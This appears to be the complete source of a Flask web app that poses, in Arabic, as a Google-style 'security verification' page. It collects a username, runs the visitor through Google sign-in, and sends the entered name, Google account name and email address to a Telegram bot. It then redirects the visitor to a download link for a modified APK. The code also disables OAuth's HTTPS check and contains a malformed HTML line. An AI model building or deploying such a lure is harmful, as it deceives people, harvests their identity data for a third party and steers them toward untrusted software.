import os
import requests
from flask import Flask, redirect, render_template_string, request, session, url_for
from google_auth_oauthlib.flow import Flow

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "secure_railway_secret_key_99")

os.environ["OAUTHLIB_INSECURE_TRANSPORT"] = "1"

# استخدام بيانات اعتماد مؤقتة مباشرة لمنع انهيار الخادم إذا لم يتوفر ملف الـ json
CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID", "")
CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET", "")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"

SCOPES = [
    "https://www.googleapis.com/auth/userinfo.email",
    "https://www.googleapis.com/auth/userinfo.profile",
    "openid",
]


def get_flow(redirect_uri):
  # إذا كانت المتغيرات موجودة في بيئة العمل، يتم بناء تدفق الاتصال مباشرة بدون الحاجة لملف
  if CLIENT_ID and CLIENT_SECRET:
    client_config = {
        "web": {
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "auth_uri": "https://accounts.google.com/o/oauth2/auth",
            "token_uri": "https://oauth2.googleapis.com/token",
        }
    }
    return Flow.from_client_config(
        client_config, scopes=SCOPES, redirect_uri=redirect_uri
    )
  else:
    # الطريقة الاحتياطية في حال وجود الملف على المنصة
    return Flow.from_client_secrets_file(
        "client_secret.json", scopes=SCOPES, redirect_uri=redirect_uri
    )


# الخطوة 1: طلب اسم المستخدم أولاً
@app.route("/", methods=["GET", "POST"])
def index():
  error = ""
  if request.method == "POST":
    username = request.form.get("username", "").strip()
    if not username:
      error = "الرجاء إدخال اسم المستخدم للمتابعة."
    else:
      session["username"] = username
      return redirect(url_for("start_google_login"))

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الأمني</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
        body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .container { width: 100%; max-width: 380px; padding: 20px; display: flex; flex-direction: column; align-items: center; text-align: center; }
        .title { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 8px; }
        .subtitle { font-size: 14px; color: #5f6368; margin-bottom: 25px; line-height: 20px; }
        .error-msg { color: #d93025; font-size: 13px; margin-bottom: 15px; width: 100%; text-align: right; background: #fce8e6; padding: 12px; border-radius: 8px; border: 1px solid #fad2cf; }
        .input-group { width: 100%; margin-bottom: 12px; text-align: right; }
        .input-group input { width: 100%; padding: 14px 12px; font-size: 15px; border: 1px solid #dadce0; border-radius: 8px; outline: none; color: #202124; background: #fff; }
        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 13px 11px; }
        .submit-btn { width: 100%; background: #1a73e8; color: white; border: none; border-radius: 25px; padding: 12px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 15px; }
        .submit-btn:hover { background: #1558b0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">التحقق الأمني</div>
        .subtitle">أدخل اسم المستخدم أولاً، ثم انتقل لتسجيل الدخول بحساب Google للتحقق.</div>

        {% if error %}
            <div class="error-msg">{{ error }}</div>
        {% endif %}

        <form method="POST" style="width: 100%;">
            <div class="input-group">
                <input type="text" name="username" required placeholder="اسم المستخدم" value="{{ request.form.get('username', '') }}">
            </div>
            <button type="submit" class="submit-btn">متابعة إلى حساب Google</button>
        </form>
    </div>
</body>
</html>
""",
      error=error,
  )


# الخطوة 2: التوجيه لصفحة جوجل الحقيقية
@app.route("/google-login")
def start_google_login():
  if "username" not in session:
    return redirect(url_for("index"))

  flow = get_flow(url_for("authorized", _external=True))
  authorization_url, state = flow.authorization_url(
      access_type="offline", include_granted_scopes="true"
  )
  session["state"] = state
  return redirect(authorization_url)


# الخطوة 3: استقبال البيانات وإرسالها للتليجرام
@app.route("/authorized")
def authorized():
  flow = get_flow(url_for("authorized", _external=True))
  flow.fetch_token(authorization_response=request.url)

  credentials = flow.credentials
  user_info_service = requests.get(
      "https://www.googleapis.com/oauth2/v1/userinfo",
      headers={"Authorization": f"Bearer {credentials.token}"},
  ).json()

  user_email = user_info_service.get("email")
  google_name = user_info_service.get("name")
  custom_username = session.get("username", "غير معروف")

  if BOT_TOKEN and CHAT_ID and user_email:
    msg = (
        "🤖 تم اجتياز التحقق الأمني بنجاح:\n\n👤 اسم المستخدم (المُدخل):"
        f" {custom_username}\n📛 اسم حساب Google: {google_name}\n📧 البريد"
        f" الإلكتروني الحقيقي: {user_email}"
    )
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

  return redirect(FINAL_REDIRECT_URL)


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
